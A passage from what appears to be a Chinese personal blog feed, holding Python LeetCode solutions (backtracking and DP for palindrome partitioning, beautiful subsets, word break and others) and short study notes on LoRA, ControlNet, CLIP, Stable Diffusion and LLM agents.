class="number">0</span>] &lt;= curr_capital:</span><br><span class="line">                    chosen_k = k_</span><br><span class="line">                    chosen_v = v_[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> chosen_v <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            curr_capital += chosen_k</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(d[chosen_k]) == <span class="number">1</span>:</span><br><span class="line">                d.pop(chosen_k)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[chosen_k].pop(<span class="number">0</span>)</span><br><span class="line">            chosen_k = <span class="literal">None</span></span><br><span class="line">            chosen_v = <span class="literal">None</span></span><br><span class="line">            k -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> curr_capital</span><br></pre></td></tr></table></figure><p>更简单的思路是zip之后按capital进行sort, 然后每一个符合条件的都丢优先队列, 资金不足以启动的时候挑一个最大利润的项目做, 然后继续丢优先队列, 最后 <code>heapq.heappop</code> 按需取出即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMaximizedCapital</span>(<span class="params">self, k: <span class="built_in">int</span>, w: <span class="built_in">int</span>, profits: <span class="type">List</span>[<span class="built_in">int</span>], capital: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        sorted_data = <span class="built_in">sorted</span>(<span class="built_in">zip</span>(capital, profits))</span><br><span class="line">        queue = []</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(profits)</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">while</span> i &lt; n <span class="keyword">and</span> sorted_data[i][<span class="number">0</span>] &lt;= w:</span><br><span class="line">                heapq.heappush(queue, -sorted_data[i][<span class="number">1</span>])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> queue:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            w -= heapq.heappop(queue)</span><br><span class="line">            k -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>杂谈</title>
      <link href="/2024/05/23/%E6%9D%82%E8%B0%88/"/>
      <url>/2024/05/23/%E6%9D%82%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<p>近期会回国一趟, 推荐系统准备在飞机上看. 其他时间看的东西就都挺杂的, 每个部分都单独记录一下显得太短, 以杂谈形势整体记录一下大概差不多.</p><h2 id="leetcodebacktrack">leetcode(backtrack)</h2><p>最近leetcode刷到了不少backtrack问题,感觉自己处理起来很不熟练, 简单记录下.</p><h3 id="palindrome-partitioning">131. Palindrome Partitioning</h3><p>给出一个字符串, 给出把这个字符串全部分割为回文串的方案.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: s = &quot;aab&quot;</span><br><span class="line">    Output: [[&quot;a&quot;,&quot;a&quot;,&quot;b&quot;],[&quot;aa&quot;,&quot;b&quot;]]</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: s = &quot;a&quot;</span><br><span class="line">    Output: [[&quot;a&quot;]]</span><br></pre></td></tr></table></figure><h4 id="回溯写法">回溯写法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">start, lst</span>):</span><br><span class="line">            <span class="keyword">nonlocal</span> ans</span><br><span class="line">            <span class="keyword">if</span> start == <span class="built_in">len</span>(s):</span><br><span class="line">                ans.append(lst)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> end <span class="keyword">in</span> <span class="built_in">range</span>(start+<span class="number">1</span>, <span class="built_in">len</span>(s)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> s[start:end] == s[start:end][::-<span class="number">1</span>]:</span><br><span class="line">                    backtrack(end, lst+[s[start:end]])</span><br><span class="line">        ans = []</span><br><span class="line">        backtrack(<span class="number">0</span>, [])</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h4 id="dp">dp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        dp = []</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>):</span><br><span class="line">            dp.append([])</span><br><span class="line">        dp[-<span class="number">1</span>].append([])</span><br><span class="line">        <span class="comment"># start from i</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="comment"># check palindrome s[i:j]</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">                sub = s[i:j]</span><br><span class="line">                <span class="keyword">if</span> sub == sub[::-<span class="number">1</span>]:</span><br><span class="line">                    <span class="keyword">for</span> lst <span class="keyword">in</span> dp[j]:</span><br><span class="line">                        dp[i].append([sub] + lst)</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="the-number-of-beautiful-subsets">2597. The Number of Beautiful Subsets</h3><p>You are given an array <code>nums</code> of positive integers and a <strong>positive</strong> integer <code>k</code>.</p><p>A subset of <code>nums</code> is <strong>beautiful</strong> if it does not contain two integers with an absolute difference equal to <code>k</code>.</p><p>Return the number of <strong>non-empty beautiful</strong> subsets of the array <code>nums</code>.</p><p>A subset of <code>nums</code> is an array that can be obtained by deleting some (possibly none) elements from <code>nums</code>. Two subsets are different if and only if the chosen indices to delete are different.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [2,4,6], k = 2</span><br><span class="line">    Output: 4</span><br><span class="line">    Explanation: The beautiful subsets of the array nums are: [2], [4], [6], [2, 6].</span><br><span class="line">    It can be proved that there are only 4 beautiful subsets in the array [2,4,6].</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [1], k = 1</span><br><span class="line">    Output: 1</span><br><span class="line">    Explanation: The beautiful subset of the array nums is [1].</span><br><span class="line">    It can be proved that there is only 1 beautiful subset in the array [1].</span><br></pre></td></tr></table></figure><h4 id="简单分析">简单分析</h4><p>有一说一这题的分析还是有一些复杂的, 起码不是非常无脑的dp和回溯.</p><p>首先整个字符串上的问题可以划分为求不同子集上面的beautiful subsets. 参考<a href="https://leetcode.com/problems/the-number-of-beautiful-subsets/solutions/3363862/c-java-python-evolve-brute-force-to-dp-explained-7-approaches">[C++, Java, Python] Evolve Brute Force to DP | Explained 7 Approaches</a></p><p><img src="beautiful_subset.png" /></p><p>在这之后, 对于每个counter里面的每一个值, 我们可以take也可以选择skip:</p><ul><li>如果我们选择take, 那么需要判断i+1的可取性:<ul><li>如果i+1恰好是<code>s[i]+k</code>, 那我们只能取count(i+2)<br /></li><li>否则我们取count(i+1)<br /></li></ul></li><li>如果我们选择skip, 就直接取下一个i的值, count(i+1)</li></ul><p>而take又会面临重复值的问题, 我们可以有2**n - 1种可能(除去空集).</p><h4 id="dp-1">dp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">beautifulSubsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line">        freq = defaultdict(collections.Counter)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">            freq[x % k][x] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> fr <span class="keyword">in</span> freq.values():</span><br><span class="line">            n = <span class="built_in">len</span>(fr)</span><br><span class="line">            s = <span class="built_in">sorted</span>(fr.items())</span><br><span class="line">            count = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">            count[n] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                skip = count[i + <span class="number">1</span>]</span><br><span class="line">                take = <span class="number">2</span> ** s[i][<span class="number">1</span>] - <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> i + <span class="number">1</span> &lt; n <span class="keyword">and</span> s[i + <span class="number">1</span>][<span class="number">0</span>] - s[i][<span class="number">0</span>] == k:</span><br><span class="line">                    take *= count[i + <span class="number">2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    take *= count[i + <span class="number">1</span>]</span><br><span class="line">                count[i] = skip + take</span><br><span class="line">            result *= count[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> result - <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="backtrack">backtrack</h4><p>思路类似<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">beautifulSubsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line">        freq = defaultdict(collections.Counter)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">            freq[x % k][x] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> fr <span class="keyword">in</span> freq.values():</span><br><span class="line">            s = <span class="built_in">sorted</span>(fr.items())</span><br><span class="line"><span class="meta">            @cache</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">i: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="built_in">len</span>(s):</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                skip = f(i + <span class="number">1</span>)</span><br><span class="line">                take = <span class="number">2</span> ** s[i][<span class="number">1</span>] - <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(s) <span class="keyword">and</span> s[i + <span class="number">1</span>][<span class="number">0</span>] - s[i][<span class="number">0</span>] == k:</span><br><span class="line">                    take *= f(i + <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    take *= f(i + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> skip + take</span><br><span class="line">            result *= f(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result - <span class="number">1</span></span><br></pre></td></tr></table></figure></p><h3 id="maximum-score-words-formed-by-letters">1255. Maximum Score Words Formed by Letters</h3><p>本来以为差不多了, 结果今天签到又是backtrack.</p><p>Given a list of <code>words</code>, list of single <code>letters</code> (might be repeating) and <code>score</code> of every character.</p><p>Return the maximum score of <strong>any</strong> valid set of words formed by using the given letters (<code>words[i]</code> cannot be used two or more times).</p><p>It is not necessary to use all characters in <code>letters</code> and each letter can only be used once. Score of letters <code>'a', 'b', 'c', ... ,'z'</code> is given by <code>score[0], score[1], ... , score[25]</code> respectively.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Example 1:  </span><br><span class="line">    Input: words = [&quot;dog&quot;,&quot;cat&quot;,&quot;dad&quot;,&quot;good&quot;], letters = [&quot;a&quot;,&quot;a&quot;,&quot;c&quot;,&quot;d&quot;,&quot;d&quot;,&quot;d&quot;,&quot;g&quot;,&quot;o&quot;,&quot;o&quot;], score = [1,0,9,5,0,0,3,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">    Output: 23</span><br><span class="line">    Explanation:</span><br><span class="line">    Score  a=1, c=9, d=5, g=3, o=2</span><br><span class="line">    Given letters, we can form the words &quot;dad&quot; (5+1+5) and &quot;good&quot; (3+2+2+5) with a score of 23.</span><br><span class="line">    Words &quot;dad&quot; and &quot;dog&quot; only get a score of 21.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: words = [&quot;xxxz&quot;,&quot;ax&quot;,&quot;bx&quot;,&quot;cx&quot;], letters = [&quot;z&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;], score = [4,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,10]</span><br><span class="line">    Output: 27</span><br><span class="line">    Explanation:</span><br><span class="line">    Score  a=4, b=4, c=4, x=5, z=10</span><br><span class="line">    Given letters, we can form the words &quot;ax&quot; (4+5), &quot;bx&quot; (4+5) and &quot;cx&quot; (4+5) with a score of 27.</span><br><span class="line">    Word &quot;xxxz&quot; only get a score of 25.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: words = [&quot;leetcode&quot;], letters = [&quot;l&quot;,&quot;e&quot;,&quot;t&quot;,&quot;c&quot;,&quot;o&quot;,&quot;d&quot;], score = [0,0,1,1,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0]</span><br><span class="line">    Output: 0</span><br><span class="line">    Explanation:</span><br><span class="line">    Letter &quot;e&quot; can only be used once.</span><br></pre></td></tr></table></figure><p>题目又长又复杂, 我还理解错了一次, 不过写起来不算难, 需要注意的是每个单词只能用一次, 我一开始以为可以用多次, backtract里面的index并没有加1, 加1之后AC.</p><h4 id="backtrack-1">backtrack</h4><p>非常直观的backtrack<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxScoreWords</span>(<span class="params">self, words: <span class="type">List</span>[<span class="built_in">str</span>], letters: <span class="type">List</span>[<span class="built_in">str</span>], score: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ctr = Counter(letters)</span><br><span class="line">        s_lst = []</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            w_score = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">                w_score += score[<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)]</span><br><span class="line">            s_lst.append(w_score)</span><br><span class="line">        word_score_lst = <span class="built_in">list</span>(<span class="built_in">zip</span>(words, s_lst))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">ifcontain</span>(<span class="params">word, ctr</span>):</span><br><span class="line">            w_ctr = Counter(word)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> w_ctr.items():</span><br><span class="line">                <span class="keyword">if</span> ctr.get(k) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> ctr.get(k) &lt; v:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">word_idx, tmp_ctr, tmp_score</span>):</span><br><span class="line">            <span class="keyword">nonlocal</span> ans</span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(word_idx, <span class="built_in">len</span>(words)):</span><br><span class="line">                <span class="keyword">if</span> ifcontain(words[idx], tmp_ctr):</span><br><span class="line">                    backtrack(idx+<span class="number">1</span>, tmp_ctr - Counter(words[idx]), tmp_score + word_score_lst[idx][<span class="number">1</span>])</span><br><span class="line">            ans.append(tmp_score)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        ans = []</span><br><span class="line">        backtrack(<span class="number">0</span>, ctr, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(ans) <span class="keyword">if</span> <span class="built_in">len</span>(ans) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><h3 id="word-break-ii">140. Word Break II</h3><p>Given a string <code>s</code> and a dictionary of strings <code>wordDict</code>, add spaces in <code>s</code> to construct a sentence where each word is a valid dictionary word. Return all such possible sentences in any order.</p><p>Note that the same word in the dictionary may be reused multiple times in the segmentation.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: s = &quot;catsanddog&quot;, wordDict = [&quot;cat&quot;,&quot;cats&quot;,&quot;and&quot;,&quot;sand&quot;,&quot;dog&quot;]</span><br><span class="line">    Output: [&quot;cats and dog&quot;,&quot;cat sand dog&quot;]</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: s = &quot;pineapplepenapple&quot;, wordDict = [&quot;apple&quot;,&quot;pen&quot;,&quot;applepen&quot;,&quot;pine&quot;,&quot;pineapple&quot;]</span><br><span class="line">    Output: [&quot;pine apple pen apple&quot;,&quot;pineapple pen apple&quot;,&quot;pine applepen apple&quot;]</span><br><span class="line">    Explanation: Note that you are allowed to reuse a dictionary word.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;,&quot;dog&quot;,&quot;sand&quot;,&quot;and&quot;,&quot;cat&quot;]</span><br><span class="line">    Output: []</span><br></pre></td></tr></table></figure><h4 id="backtrack-2">backtrack</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wordBreak</span>(<span class="params">self, s: <span class="built_in">str</span>, wordDict: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">i, string</span>):</span><br><span class="line">            <span class="keyword">nonlocal</span> ans</span><br><span class="line">            <span class="keyword">if</span> i == <span class="built_in">len</span>(s):</span><br><span class="line">                ans.append(string)</span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> wordDict:</span><br><span class="line">                w_l = <span class="built_in">len</span>(word)</span><br><span class="line">                <span class="keyword">if</span> s[i:i+w_l] == word:</span><br><span class="line">                    <span class="keyword">if</span> string:</span><br><span class="line">                        backtrack(i+w_l, string+<span class="string">&#x27; &#x27;</span>+word)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        backtrack(i+w_l, word)</span><br><span class="line"></span><br><span class="line">        backtrack(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h4 id="dp-2">dp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wordBreak</span>(<span class="params">self, s: <span class="built_in">str</span>, wordDict: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        dp = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        dp.append([<span class="string">&#x27;&#x27;</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> wordDict:</span><br><span class="line">                w_l = <span class="built_in">len</span>(word)</span><br><span class="line">                <span class="keyword">if</span> i+w_l &lt;= n <span class="keyword">and</span> s[i:i+w_l] == word:</span><br><span class="line">                    <span class="keyword">for</span> string <span class="keyword">in</span> dp[i+w_l]:</span><br><span class="line">                        <span class="keyword">if</span> string:</span><br><span class="line">                            dp[i].append(word + <span class="string">&#x27; &#x27;</span> + string)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            dp[i].append(word)</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="lora-and-controlnet">LORA and ControlNet</h2><p><a href="https://blog.csdn.net/colorant/article/details/136732221">快速理解AIGC图像控制利器ControlNet和Lora的架构原理</a></p><p>之前只了解了LoRA是给大模型加了一个side adapter从而进行小参数训练让模型能适应特定任务, 但后面看到ControlNet发现原理似乎有点类似, 所以这里仔细了解了一下细节.</p><h3 id="lora">LoRA</h3><blockquote><p>从数学的角度来说，一个矩阵的信息密度，大体可以用矩阵的“秩”（Rank）来粗略衡量（这也是LoRA中Rank的语义来源）. LoRA的方式是把旁路的矩阵替换成两个低秩矩阵的乘积。比如1000x1000的矩阵，用1000x2 和 2x1000的矩阵来替换，后者两个矩阵乘积运算的结果也是一个1000x1000的矩阵，也就是输入和输出可以和原矩阵的维度相匹配，但秩的上限就只有2了（因为按秩的定义，结果矩阵可以用相乘的两个矩阵的两行或两列数据的四则运算得到所有行列的数据）</p></blockquote><p>所以理论最佳方式是LoRA可以利用参数矩阵包含的信息密度上限, 从而降低需要的参数上百倍.</p><h3 id="controlnet">ControlNet</h3><blockquote><p>ControlNet对原模型的参数矩阵并没有进行压缩，而是进行了1比1的精确复刻。当然他并没有复刻所有的模型层次，而是只复刻了部分编码层的模型参数结构。实际应用中，是将每一层编码层的输出结果通过一些线性变换再混合回原模型的解码层中来实现对最终输出效果的干预和控制。</p></blockquote><p>因此ControlNet一般会比LoRA大一些,</p><p><img src="ControlNet.avif" /></p><p>其次就是LoRA一般是控制图片风格层面, 而ControlNet一般是从图片层面干预输出, 从而可以让输出的图片和输入的图片有相同动作.</p><h2 id="clip-and-stable-diffusion">CLIP and Stable Diffusion</h2><p>之前看的LDM和Stable Diffusion v1其实text encoder用的都是bert, 但后面的SDv2里面就已经换成了CLIP, 顺带一提再后来的SDXL相对于SD又有</p><ol type="1"><li>UNet大小层面的升级<br /></li><li>尺寸和裁剪的处理<br /></li><li>加了refiner对生成的图片加了细节处理</li></ol><h3 id="clip">CLIP</h3><p>全称Contrastive Language–Image Pre-training, 多模态相关. 在图文并行的模型中表现突出</p><p>简单来说就是对图进行编码生成向量v_img, 对文本编码生成v_text, 然后做对比学习, 让图文匹配的 <code>$ v_&#123;img&#125; \cdot v_&#123;text&#125;$</code>向1靠, 让不匹配的向0靠.</p><p><img src="clip_matrix.png" /></p><p><strong>为什么不用prediction而用contrast</strong>:</p><p><img src="CLIP.png" /></p><h2 id="llm-agent">LLM Agent</h2><blockquote><p>Agent = LLM + Memory + planning skills + tool use</p></blockquote><p>大概来说就是LLM作为中枢大脑, 可以进行自我规划, 对任务进行自行分解, 自我提示, 以及调用外部工具从而达到某些目的的智能体.</p><p>代表有AutoGPT等</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>工业界推荐系统相关(2)-粗排精排</title>
      <link href="/2024/05/17/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3-2-%E7%B2%97%E6%8E%92%E7%B2%BE%E6%8E%92/"/>
      <url>/2024/05/17/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3-2-%E7%B2%97%E6%8E%92%E7%B2%BE%E6%8E%92/</url>
      
